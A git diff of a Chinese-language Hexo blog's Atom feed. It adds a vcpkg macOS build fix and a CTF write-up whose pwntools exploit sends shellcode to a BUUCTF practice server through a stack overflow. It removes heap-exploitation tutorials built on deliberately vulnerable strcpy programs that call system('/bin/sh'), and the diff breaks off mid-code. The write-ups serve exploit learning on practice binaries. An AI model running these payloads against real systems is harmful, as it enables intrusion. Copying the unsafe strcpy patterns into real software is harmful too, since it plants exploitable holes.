@@ -5,7 +5,7 @@
   <link href="/atom.xml" rel="self"/>
   
   <link href="http://iosmosis.github.io/"/>
-  <updated>2020-03-29T12:33:24.600Z</updated>
+  <updated>2020-05-05T04:18:15.164Z</updated>
   <id>http://iosmosis.github.io/</id>
   
   <author>
@@ -14,6 +14,54 @@
   </author>
   
   <generator uri="http://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>vcpkg-MacOS10.15-安装问题</title>
+    <link href="http://iosmosis.github.io/2020/05/05/vcpkg-MacOS10-15-%E5%AE%89%E8%A3%85%E9%97%AE%E9%A2%98/"/>
+    <id>http://iosmosis.github.io/2020/05/05/vcpkg-MacOS10-15-安装问题/</id>
+    <published>2020-05-05T04:15:25.000Z</published>
+    <updated>2020-05-05T04:18:15.164Z</updated>
+    
+    <content type="html"><![CDATA[<h4 id="在安装vcpkg时遇到如下报错"><a href="#在安装vcpkg时遇到如下报错" class="headerlink" title="在安装vcpkg时遇到如下报错"></a>在安装vcpkg时遇到如下报错</h4><p></p><p class="code-caption" data-lang="bash" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
+<pre class=" language-bash"><code class="language-bash">6/75<span class="token punctuation">]</span> Building CXX object CMakeFiles/vcpkglib.dir/src/vcpkg/archives.cpp.o
+FAILED: CMakeFiles/vcpkglib.dir/src/vcpkg/archives.cpp.o
+/usr/local/bin/g++-9  -DVCPKG_DISABLE_METRICS<span class="token operator">=</span>0 -DVCPKG_USE_STD_FILESYSTEM<span class="token operator">=</span>1 -I<span class="token punctuation">..</span>/include -O3 -DNDEBUG -isysroot /Library/Developer/CommandLineTools/SDKs/MacOSX10.15.sdk   -std<span class="token operator">=</span>c++17 -MD -MT CMakeFiles/vcpkglib.dir/src/vcpkg/archives.cpp.o -MF CMakeFiles/vcpkglib.dir/src/vcpkg/archives.cpp.o.d -o CMakeFiles/vcpkglib.dir/src/vcpkg/archives.cpp.o -c <span class="token punctuation">..</span>/src/vcpkg/archives.cpp
+In <span class="token function">file</span> included from /Library/Developer/CommandLineTools/SDKs/MacOSX10.15.sdk/usr/include/wchar.h:90,
+                 from /usr/local/Cellar/gcc/9.1.0/include/c++/9.1.0/cwchar:44,
+                 from /usr/local/Cellar/gcc/9.1.0/include/c++/9.1.0/bits/postypes.h:40,
+                 from /usr/local/Cellar/gcc/9.1.0/include/c++/9.1.0/bits/char_traits.h:40,
+                 from /usr/local/Cellar/gcc/9.1.0/include/c++/9.1.0/string:40,
+                 from /usr/local/Cellar/gcc/9.1.0/include/c++/9.1.0/stdexcept:39,
+                 from /usr/local/Cellar/gcc/9.1.0/include/c++/9.1.0/array:39,
+                 from /usr/local/Cellar/gcc/9.1.0/include/c++/9.1.0/tuple:39,
+                 from /usr/local/Cellar/gcc/9.1.0/include/c++/9.1.0/functional:54,
+                 from /usr/local/Cellar/gcc/9.1.0/include/c++/9.1.0/pstl/glue_algorithm_defs.h:13,
+                 from /usr/local/Cellar/gcc/9.1.0/include/c++/9.1.0/algorithm:71,
+                 from <span class="token punctuation">..</span>/include/pch.h:22,
+                 from <span class="token punctuation">..</span>/src/vcpkg/archives.cpp:1:
+/usr/local/Cellar/gcc/9.1.0/lib/gcc/9/gcc/x86_64-apple-darwin18/9.1.0/include-fixed/stdio.h:222:7: error: conflicting declaration of <span class="token string">'char* ctermid(char*)'</span> with <span class="token string">'C'</span> linkage
+  222 <span class="token operator">|</span> char *ctermid<span class="token punctuation">(</span>char *<span class="token punctuation">)</span><span class="token punctuation">;</span>
+      <span class="token operator">|</span>       ^~~~~~~
+In <span class="token function">file</span> included from /Library/Developer/CommandLineTools/SDKs/MacOSX10.15.sdk/usr/include/unistd.h:525,
+                 from <span class="token punctuation">..</span>/include/pch.h:19,
+                 from <span class="token punctuation">..</span>/src/vcpkg/archives.cpp:1:
+/Library/Developer/CommandLineTools/SDKs/MacOSX10.15.sdk/usr/include/_ctermid.h:26:10: note: previous declaration with <span class="token string">'C++'</span> linkage
+   26 <span class="token operator">|</span> char    *ctermid<span class="token punctuation">(</span>char *<span class="token punctuation">)</span><span class="token punctuation">;</span>
+      <span class="token operator">|</span>          ^~~~~~~
+ninja: build stopped: subcommand failed.
+</code></pre>
+<h4 id="解决方法"><a href="#解决方法" class="headerlink" title="解决方法"></a>解决方法</h4><p></p><p class="code-caption" data-lang="" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
+<pre><code>./bootstrap-vcpkg.sh --allowAppleClang
+</code></pre>]]></content>
+    
+    <summary type="html">
+    
+      &lt;h4 id=&quot;在安装vcpkg时遇到如下报错&quot;&gt;&lt;a href=&quot;#在安装vcpkg时遇到如下报错&quot; class=&quot;headerlink&quot; title=&quot;在安装vcpkg时遇到如下报错&quot;&gt;&lt;/a&gt;在安装vcpkg时遇到如下报错&lt;/h4&gt;&lt;p&gt;&lt;/p&gt;&lt;p class=&quot;code
+    
+    </summary>
+    
+    
+  </entry>
   
   <entry>
     <title>shellcode</title>
@@ -66,7 +114,7 @@ s<span class="token punctuation">.</span>close<span class="token punctuation">(<
     <link href="http://iosmosis.github.io/2020/02/23/buuctf-Writeup/"/>
     <id>http://iosmosis.github.io/2020/02/23/buuctf-Writeup/</id>
     <published>2020-02-23T08:41:30.000Z</published>
-    <updated>2020-02-28T14:59:45.107Z</updated>
+    <updated>2020-04-23T12:49:25.943Z</updated>
     
     <content type="html"><![CDATA[<h1 id="OGeek2019-babyrop"><a href="#OGeek2019-babyrop" class="headerlink" title="[OGeek2019]babyrop"></a>[OGeek2019]babyrop</h1><h4 id="检查保护"><a href="#检查保护" class="headerlink" title="检查保护"></a>检查保护</h4><p></p><p class="code-caption" data-lang="bash" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
 <pre class=" language-bash"><code class="language-bash">ios@ubuntu:~/APwn/buuctf$ checksec ogeek-babyrop
@@ -1162,6 +1210,35 @@ system<span class="token operator">=</span><span class="token number">0x8048320<
 sh<span class="token operator">=</span><span class="token number">0x804A024</span>
 payload<span class="token operator">=</span><span class="token string">'a'</span><span class="token operator">*</span><span class="token number">0x88</span><span class="token operator">+</span><span class="token string">'b'</span><span class="token operator">*</span><span class="token number">4</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>system<span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span><span class="token number">0x1553155</span><span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>sh<span class="token punctuation">)</span>
 p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
+p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>
+</code></pre>
+<h2 id="ciscn-2019-n-5"><a href="#ciscn-2019-n-5" class="headerlink" title="ciscn_2019_n_5"></a>ciscn_2019_n_5</h2><p>基本栈溢出 ret_shellcode</p>
+<p>检查保护</p>
+<p></p><p class="code-caption" data-lang="bash" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
+<pre class=" language-bash"><code class="language-bash">ios@ubuntu:~/APwn/buuctf$ checksec ciscn_2019_n_5
+<span class="token punctuation">[</span>*<span class="token punctuation">]</span> <span class="token string">'/home/ios/APwn/buuctf/ciscn_2019_n_5'</span>
+    Arch:     amd64-64-little
+    RELRO:    Partial RELRO
+    Stack:    No canary found
+    NX:       NX disabled
+    PIE:      No PIE <span class="token punctuation">(</span>0x400000<span class="token punctuation">)</span>
+    RWX:      Has RWX segments
+ios@ubuntu:~/APwn/buuctf$
+</code></pre>
+<p>保护全关 </p>
+<p>exp</p>
+<p></p><p class="code-caption" data-lang="python" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
+<pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
+context<span class="token punctuation">(</span>arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span> os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span>log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span>
+<span class="token comment" spellcheck="true">#p=process('./ciscn_2019_n_5')</span>
+p<span class="token operator">=</span>remote<span class="token punctuation">(</span><span class="token string">'node3.buuoj.cn'</span><span class="token punctuation">,</span><span class="token number">25965</span><span class="token punctuation">)</span>
+sh<span class="token operator">=</span>asm<span class="token punctuation">(</span>shellcraft<span class="token punctuation">.</span>amd64<span class="token punctuation">.</span>sh<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>sh<span class="token punctuation">)</span>
+p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'What do you want to say to me?'</span><span class="token punctuation">)</span>
+payload<span class="token operator">=</span><span class="token string">'a'</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token number">0x20</span><span class="token operator">+</span><span class="token number">0x8</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x601080</span><span class="token punctuation">)</span>
+
+p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
+
 p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>
 </code></pre>
 ]]></content>
@@ -5972,213 +6049,6 @@ p<span class="token punctuation">.</span>interactive<span class="token punctuati
     
     </summary>
     
-    
-  </entry>
-  
-  <entry>
-    <title>heap-学习</title>
-    <link href="http://iosmosis.github.io/2018/07/18/heap-%E5%AD%A6%E4%B9%A0/"/>
-    <id>http://iosmosis.github.io/2018/07/18/heap-学习/</id>
-    <published>2018-07-18T09:12:30.000Z</published>
-    <updated>2019-09-12T04:47:59.392Z</updated>
-    
-    <content type="html"><![CDATA[<h2 id="heap0"><a href="#heap0" class="headerlink" title="heap0"></a>heap0</h2><p>源代码</p>
-<p></p><p class="code-caption" data-lang="c" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
-<pre class=" language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span>
-<span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;unistd.h></span></span>
-<span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;string.h></span></span>
-<span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span>
-<span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;sys/types.h></span></span>
-<span class="token keyword">struct</span> data <span class="token punctuation">{</span>
-  <span class="token keyword">char</span> name<span class="token punctuation">[</span><span class="token number">128</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
-<span class="token punctuation">}</span><span class="token punctuation">;</span>
-
-<span class="token keyword">struct</span> fp <span class="token punctuation">{</span>
-  <span class="token keyword">int</span> <span class="token punctuation">(</span><span class="token operator">*</span>fp<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-<span class="token punctuation">}</span><span class="token punctuation">;</span>
-
-<span class="token keyword">void</span> <span class="token function">winner</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
-<span class="token punctuation">{</span>
-  <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"/bin/sh"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-<span class="token punctuation">}</span>
-
-<span class="token keyword">void</span> <span class="token function">nowinner</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
-<span class="token punctuation">{</span>
-  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"level has not been passed\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-<span class="token punctuation">}</span>
-
-<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>argv<span class="token punctuation">)</span>
-<span class="token punctuation">{</span>
-  <span class="token keyword">struct</span> data <span class="token operator">*</span>d<span class="token punctuation">;</span>
-  <span class="token keyword">struct</span> fp <span class="token operator">*</span>f<span class="token punctuation">;</span>
-  d <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token keyword">struct</span> data<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-  f <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token keyword">struct</span> fp<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-  f<span class="token operator">-></span>fp <span class="token operator">=</span> nowinner<span class="token punctuation">;</span>
-  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"data is at %p, fp is at %p\n"</span><span class="token punctuation">,</span> d<span class="token punctuation">,</span> f<span class="token punctuation">)</span><span class="token punctuation">;</span>
-  <span class="token function">strcpy</span><span class="token punctuation">(</span>d<span class="token operator">-></span>name<span class="token punctuation">,</span> argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-  f<span class="token operator">-></span><span class="token function">fp</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-<span class="token punctuation">}</span>
-</code></pre>
-<p>编译命令 </p>
-<p></p><p class="code-caption" data-lang="bash" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
-<pre class=" language-bash"><code class="language-bash">gcc -m32 -fno-stack-protector -o heap0 heap0.c
-</code></pre>
-<p>可以检查下生成后的保护</p>
-<p></p><p class="code-caption" data-lang="bash" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
-<pre class=" language-bash"><code class="language-bash">ubuntu@ubuntu:~/heap$ checksec heap0
-<span class="token punctuation">[</span>*<span class="token punctuation">]</span> <span class="token string">'/home/ubuntu/heap/heap0'</span>
-    Arch:     i386-32-little
-    RELRO:    Partial RELRO
-    Stack:    No canary found
-    NX:       NX enabled
-    PIE:      No PIE <span class="token punctuation">(</span>0x8048000<span class="token punctuation">)</span>
-</code></pre>
-<p>我们通过ida进行分析</p>
-<p></p><p class="code-caption" data-lang="c" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
-<pre class=" language-c"><code class="language-c"><span class="token keyword">int</span> __cdecl <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>argv<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>envp<span class="token punctuation">)</span>
-<span class="token punctuation">{</span>
-  <span class="token keyword">char</span> <span class="token operator">*</span>dest<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// ST1C_4</span>
-  <span class="token keyword">void</span> <span class="token punctuation">(</span><span class="token operator">*</span><span class="token operator">*</span>v4<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// eax</span>
-  <span class="token keyword">void</span> <span class="token punctuation">(</span><span class="token operator">*</span><span class="token operator">*</span>v5<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// ST18_4</span>
-
-  dest <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x80u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-  v4 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token punctuation">(</span><span class="token operator">*</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">4u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-  v5 <span class="token operator">=</span> v4<span class="token punctuation">;</span>
-  <span class="token operator">*</span>v4 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span><span class="token punctuation">)</span>nowinner<span class="token punctuation">;</span>
-  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"data is at %p, fp is at %p\n"</span><span class="token punctuation">,</span> dest<span class="token punctuation">,</span> v4<span class="token punctuation">)</span><span class="token punctuation">;</span>
-  <span class="token function">strcpy</span><span class="token punctuation">(</span>dest<span class="token punctuation">,</span> argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-  <span class="token punctuation">(</span><span class="token operator">*</span>v5<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-  <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
-<span class="token punctuation">}</span>
-</code></pre>
-<p>漏洞存在于strcpy函数</p>
-<h3 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h3><p>因为该程序堆是连续分配的所以在内存结构上也是连续的</p>
-<p> <img src="/2018/07/18/heap-学习/1.png" alt="1"></p>
-<p>所以我们需要溢出dest覆盖到v4接着修改nowinner为winner函数地址</p>
-<p>填充量= malloc(0x80u) +第二个chunk头0x8=136</p>
-<p>或者gdb调试</p>
-<p></p><p class="code-caption" data-lang="bash" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
-<pre class=" language-bash"><code class="language-bash">gef➤  <span class="token function">file</span> heap0
-Reading symbols from heap0<span class="token punctuation">..</span>.<span class="token punctuation">(</span>no debugging symbols found<span class="token punctuation">)</span><span class="token punctuation">..</span>.done.
-gef➤  pattern create 150
-<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Generating a pattern of 150 bytes
-aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabma
-<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Saved as <span class="token string">'<span class="token variable">$_gef0</span>'</span>
-gef➤  r aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabma
-Starting program: /home/ubuntu/heap/heap0 aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabma
-data is at 0x804b008, fp is at 0x804b090
-
-Program received signal SIGSEGV, Segmentation fault.
-0x6261616a <span class="token keyword">in</span> ?? <span class="token punctuation">(</span><span class="token punctuation">)</span>
-gef➤  pattern offset 0x6261616a
-<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Searching <span class="token string">'0x6261616a'</span>
-<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Found at offset 136 <span class="token punctuation">(</span>little-endian search<span class="token punctuation">)</span> likely
-gef➤
-</code></pre>
-<p>同样可以得到填充量</p>
-<p>找到winner函数地址 0x80484CB</p>
-<p>所以可以构造exp</p>
-<p></p><p class="code-caption" data-lang="python" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
-<pre class=" language-python"><code class="language-python"><span class="token punctuation">.</span><span class="token operator">/</span>heap0 `python <span class="token operator">-</span>c <span class="token string">"print 'a'*136+'\xCB\x84\x04\x08'"</span>`
-</code></pre>
-<p>这里有个小问题 用pwntools写的exp却无法利用 如果有大佬看到这篇文章 还求解答(已解决 如果你还没反应过来可以学习下argv[1]含义…感谢-SK-师傅指点 果然还是自己太差了 这里记录并且会继续努力下去)</p>
-<p></p><p class="code-caption" data-lang="python" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
-<pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
-
-p <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'./heap0'</span><span class="token punctuation">)</span>
-
-payload <span class="token operator">=</span> <span class="token string">'A'</span><span class="token operator">*</span><span class="token number">136</span><span class="token operator">+</span><span class="token string">"\xCB\x84\x04\x08"</span>
-p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
-p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>
-<span class="token operator">//</span> 错误展示<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
-</code></pre>
-<h2 id="heap1"><a href="#heap1" class="headerlink" title="heap1"></a>heap1</h2><p></p><p class="code-caption" data-lang="c" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
-<pre class=" language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span>
-<span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;unistd.h></span></span>
-<span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;string.h></span></span>
-<span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span>
-<span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;sys/types.h></span></span>
-
-<span class="token keyword">struct</span> internet <span class="token punctuation">{</span>
-  <span class="token keyword">int</span> priority<span class="token punctuation">;</span>
-  <span class="token keyword">char</span> <span class="token operator">*</span>name<span class="token punctuation">;</span>
-<span class="token punctuation">}</span><span class="token punctuation">;</span>
-
-<span class="token keyword">void</span> <span class="token function">winner</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
-<span class="token punctuation">{</span>
-  <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"/bin/sh"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-<span class="token punctuation">}</span>
-
-<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>argv<span class="token punctuation">)</span>
-<span class="token punctuation">{</span>
-  <span class="token keyword">struct</span> internet <span class="token operator">*</span>i1<span class="token punctuation">,</span> <span class="token operator">*</span>i2<span class="token punctuation">,</span> <span class="token operator">*</span>i3<span class="token punctuation">;</span>
-
-  i1 <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token keyword">struct</span> internet<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-  i1<span class="token operator">-></span>priority <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>
-  i1<span class="token operator">-></span>name <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-
-  i2 <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token keyword">struct</span> internet<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-  i2<span class="token operator">-></span>priority <span class="token operator">=</span> <span class="token number">2</span><span class="token punctuation">;</span>
-  i2<span class="token operator">-></span>name <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-
-  <span class="token function">strcpy</span><span class="token punctuation">(</span>i1<span class="token operator">-></span>name<span class="token punctuation">,</span> argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-  <span class="token function">strcpy</span><span class="token punctuation">(</span>i2<span class="token operator">-></span>name<span class="token punctuation">,</span> argv<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-
-  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"and that's a wrap folks!\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-<span class="token punctuation">}</span>
-</code></pre>
-<p>编译命令</p>
-<p></p><p class="code-caption" data-lang="c" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
-<pre class=" language-c"><code class="language-c">gcc <span class="token operator">-</span>m32 <span class="token operator">-</span>fno<span class="token operator">-</span>stack<span class="token operator">-</span>protector <span class="token operator">-</span>o heap1 heap1<span class="token punctuation">.</span>c
-</code></pre>
-<p>从源代码中可以看到,internet已经分配了两个结构，每个结构包含一个name单独分配的指针。这意味着 internet 在堆分配的struct将包含志强</p>
-<p>检查保护</p>
-<p></p><p class="code-caption" data-lang="bash" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
-<pre class=" language-bash"><code class="language-bash">ubuntu@ubuntu:~/heap$ checksec heap1
-<span class="token punctuation">[</span>*<span class="token punctuation">]</span> <span class="token string">'/home/ubuntu/heap/heap1'</span>
-    Arch:     i386-32-little
-    RELRO:    Partial RELRO
-    Stack:    No canary found
-    NX:       NX enabled
-    PIE:      No PIE <span class="token punctuation">(</span>0x8048000<span class="token punctuation">)</span>
-</code></pre>
-<p>只开启nx</p>
-<p>我们通过ida来分析</p>
-<p></p><p class="code-caption" data-lang="c" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
-<pre class=" language-c"><code class="language-c"><span class="token keyword">int</span> __cdecl <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>argv<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>envp<span class="token punctuation">)</span>
-<span class="token punctuation">{</span>
-  _DWORD <span class="token operator">*</span>v3<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// eax</span>
-  _DWORD <span class="token operator">*</span>v4<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// ST1C_4</span>
-  _DWORD <span class="token operator">*</span>v5<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// eax</span>
-  _DWORD <span class="token operator">*</span>v6<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// ST18_4</span>
-
-  v3 <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">8u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-  v4 <span class="token operator">=</span> v3<span class="token punctuation">;</span>
-  <span class="token operator">*</span>v3 <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>
-  v3<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">8u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-  v5 <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">8u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-  v6 <span class="token operator">=</span> v5<span class="token punctuation">;</span>
-  <span class="token operator">*</span>v5 <span class="token operator">=</span> <span class="token number">2</span><span class="token punctuation">;</span>
-  v5<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">8u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-  <span class="token function">strcpy</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span>v4<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
